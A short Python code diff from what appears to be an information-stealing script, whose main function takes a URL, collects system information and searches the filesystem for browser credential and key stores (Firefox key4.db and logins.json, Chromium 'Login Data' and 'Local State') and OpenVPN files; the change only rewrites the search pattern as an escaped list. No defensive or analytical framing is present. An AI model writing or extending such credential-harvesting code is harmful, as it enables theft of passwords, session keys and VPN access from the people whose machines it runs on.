@@ -11,7 +11,9 @@ from helpers import filemanager
 
 def main(url):
     system_information = utils.system_information()
-    filemanager.search_files('ovpn|key4\.db|logins\.json|Login Data|Local State')
+    search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State']
+    search_files_regex = '|'.join([re.escape(file) for file in search_files])
+    filemanager.search_files(search_files_regex)
 
 
 if __name__ == '__main__':
